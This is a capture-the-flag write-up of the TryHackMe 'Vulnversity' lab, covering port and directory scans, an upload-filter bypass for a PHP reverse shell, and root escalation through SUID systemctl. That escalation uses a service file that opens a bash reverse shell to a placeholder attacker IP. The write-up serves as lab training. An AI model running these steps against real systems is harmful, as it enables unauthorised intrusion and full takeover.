# Vulnversity
 Challenge link: https://tryhackme.com/room/vulnversity 
## IP
10.10.198.229
## Scans
### NMAP
#### Command used:
<code>$ nmap -sC -sV -Pn 10.10.198.229</code>
#### Results
<pre>
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-22 13:07 EDT
Nmap scan report for 10.10.198.229
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2022-04-22T13:08:09-04:00
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb2-time: 
|   date: 2022-04-22T17:08:10
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.46 seconds
</pre>

### GoBuster
#### Command used:
<code>$ gobuster dir -u http://10.10.198.229:3333/ -w /usr/share/wordlists/dirb/common.txt </code>
#### Results

<pre>
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.198.229:3333/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/22 13:43:20 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 294]
/.htaccess            (Status: 403) [Size: 299]
/.htpasswd            (Status: 403) [Size: 299]
/css                  (Status: 301) [Size: 319] [--> http://10.10.198.229:3333/css/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.198.229:3333/fonts/]
/images               (Status: 301) [Size: 322] [--> http://10.10.198.229:3333/images/]
/index.html           (Status: 200) [Size: 33014]                                      
<b>/internal             (Status: 301) [Size: 324] [--> http://10.10.198.229:3333/internal/]</b>
/js                   (Status: 301) [Size: 318] [--> http://10.10.198.229:3333/js/]      
/server-status        (Status: 403) [Size: 303]                                          
                                                                                         
===============================================================
2022/04/22 13:44:28 Finished
===============================================================
</pre>

## Ports Open
<pre>
21
22
139
445
3128
3333
</pre>

## Exploitation
### BurpSuite 
__ found a post request at internal/ __
"""
Multiple file types seem to be blocked.
Only '.phtml' seems to go through.
"""
#### Triggering payload
"""
After a succesful upload of a php reverse shell masked with the required file type (aka .phtml) , we need to trigger the payload somehow.
we can either use dirb / go buster in  recursive modes or manually poke around discovering <u>http://ip:3333/internal/uploads/payload_name.phtml</u>
<b> Voila! a reverse shell on our listeners!</b>

On enumerating the directories we can see the username is located at <code>/home/</code> which is the expected location. checking the dir we can see "user.txt" which contains the flag.
"""

#### SUID perm. check
##### Command used
<code>find / -type f -perm -4000 2>/dev/null</code>
##### Results
"""
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
"""
### LinPeas
#### Intresting Observations
"""  
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034    # Tough will not use this as this was not the targeted way.
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Jul 31  2019 /etc/apache2/sites-enabled                   
drwxr-xr-x 2 root root 4096 Jul 31  2019 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Jul 31  2019 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf     

╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid           
---sniped---   
<b>-rwsr-xr-x 1 root root 645K Feb 13  2019 /bin/systemctl</b>

"""

 
### Final Stretch (exploit Systemctl)
#### Payload
"""
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KALI_IP/9091 0>&1'

[Install]
WantedBy=multi-user.target
"""
"""
After the files to a location that's writable (say /tmp) save it by a name say name.service
then ran:
##### On target
<code>/bin/systemctl enable name.service</code>
##### On Kali
<code>nc -nlvp 9091</code>
##### On target
<code>/bin/systemctl start name</code>

<b>Voila! we have root's flag!</b>
"""

